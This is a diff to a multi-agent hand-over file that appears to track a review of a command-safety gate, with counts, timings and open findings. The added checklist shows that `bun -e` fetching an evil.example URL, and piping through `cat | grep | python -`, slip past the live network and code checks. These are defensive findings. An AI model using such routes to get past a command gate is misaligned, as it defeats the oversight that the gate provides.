@@ -474,6 +474,9 @@ Rebuild it when boxes change; the boxes themselves are the record.
 - gtp_ + gtb_ R12-1 (Should, not blocking in shadow): price_rows() falls back to " ... | ?
 - gtp_ (lows): quoted multi-target word not split before normalising (one seed kin ... | ?
 - ATN (morning report): a run rule for lga_'s 9-min release check (old vs new stac ... | ?
+- gtp_ S1 (Should, before web_allow on): bun in PKG skips the web check - `bun -e ... | ?
+- gtp_ S2 (= R12-1, before price on): 13 amd64 twattila builds refused with bak16 ... | ?
+- gtp_ (nits): heredoc piped into `python -m json.tool` / fed to `python x.py` sca ... | ?
 - C REVIEW CARRY-OVERS (c23r_ 11-20): N-6 Uninstall sets arena_size = 0 first -> C ... | ?
 - TRAP HARNESS FOLLOW-UP (s5x_ 11-20 22:1x, optional: both rows are latched): the ... | ?
 - TRACK B BIG DESIGNS (ATN 11-20 22:1x): bd1o_ B3b + B4 DONE (reports/bd1o_design_ ... | ?
@@ -8714,9 +8717,32 @@ heading text are in HANDOFF_ARCHIVE.md)
         are budget.py's own, gate back to 120 s (GATE_FLOOR_S). test_lab_unit 34, test_iq_frames 16. Seen: gtb_
         changed lab\budget.py + tests\test_budget.py at 09:04:36 (after gtv_'s runs; functions + GATE_FLOOR_S
         still there) - gtb_'s round, its own re-check. IQ / LAB V1.2 + ALL NITS CLOSED.
-        Agents (6): h0i_ (H0 F1-F4), gtw_ (gtp_ round 12 re-check), gtb_ (slot-wait test + load + gate seed + R12-1
-        half), grs_ (first-frame design revision), lga_ (release check runner, dry run only), t4i_ (T5 manifest
-        rows + B1 risks)
+        gtw_ RE-CHECK 12 = OK + 2 SHOULDS 09:0x (plan_1117/gtw_s1c_recheck12_handback.md; gtw_s1c_review.md "## S1c
+        re-check 12" line 1055; scratch gtw_r12_* / gtw_sb12* / gtw_suite12_*): suite 723 / 723 in its own sandbox
+        (gtb_'s 08:48 budget.py); every re-check 11 finding closed for real (hg1 bak16 124 vs live SHADOW, one
+        reason text, FAULT rate, parser label, all nits); corpus 15,119: bak16 250 vs live 253 (3 = long-spelling
+        gated_build, = gtp_'s 259 / 262); no ordinary command newly refused. Price history: 0 samples lost (only the
+        30 cap), 103,941 seeds, 388 build seeds before / after, prices.tsv 6,920, watch_runs.tsv byte-equal to
+        bak17. Watch e2e test: python sleeps + fake ns_busy + taskkill of its own tree only, all sandbox copies.
+        Section 8: numbers match (locked y, wait 2.0, run 80.5, 1 row) but text changes (past tense; 2.0 s =
+        start-up + one poll, no other build; the row has no agent; amd64 twattila not refused today (S2);
+        Commands column today 36 / 32 / 0; B nit: PS 5.1 drops an empty $Agent -> `--agent --` exit 2). 5 ms check:
+        2.4 ms idle, 7.0-7.9 ms with 32 CPU burners, best-of-5 still 6.4 -> best-of-N does NOT fix it; use the
+        median of 5 interleaved 8 KB / 1 KB ratios < 16 (quadratic ~64) + best of 5 < 20 ms. -> gtp_ ROUND 13
+        STARTED (R12-1 + these).
+        - [ ] gtp_ S1 (Should, before web_allow on): bun in PKG skips the web check - `bun -e "fetch('https://
+            evil.example/x')"` refused by bak16, passes live (Bash + PS; window.fetch / self.fetch too): the PKG
+            branch runs before the network branch and empties the URL list -> take bun only for package verbs,
+            everything else falls through (gtw_ 09:0x).
+        - [ ] gtp_ S2 (= R12-1, before price on): 13 amd64 twattila builds refused with bak16 prices, 0 live; under A
+            every kind loses its refusal at its first wrapped run until 10 watch rows (gtw_ 09:0x).
+        - [ ] gtp_ (nits): heredoc piped into `python -m json.tool` / fed to `python x.py` scanned as code (old,
+            tee walk widens it); `cat | grep | python -` passes; os.replace failure on gate_faults.json repeats the
+            FAULT row per process + leaves .<pid>.tmp files (remove the tmp in except); quoted target list with
+            spaces not split (gtw_ 09:0x).
+        Agents (6): h0i_ (H0 F1-F4), gtp_ (round 13: R12-1 + gtw_ S1 / Section 8 / timing / nits), gtb_ (slot-wait
+        test + load + gate seed + R12-1 half), grs_ (first-frame design revision), lga_ (release check runner, dry
+        run only), t4i_ (T5 manifest rows + B1 risks)
         (B1 real-routine tests + N4) + coordinator bulk index + merge builds. Idle: bd1r_, lga_, b13r_ (re-checks
         c3i_), lgf2_, c33i_, upt_, upr_ (re-checks h0i_), gpp_, gbc_, gtb_ (waits gpr_), gti_ (r1a / r1b nits,
         batched), grs_, gtk_, gtw_ (re-checks gtp_), t4i_ (waits ebr_), gtq_, gtl_ (staged jobs suite + swap
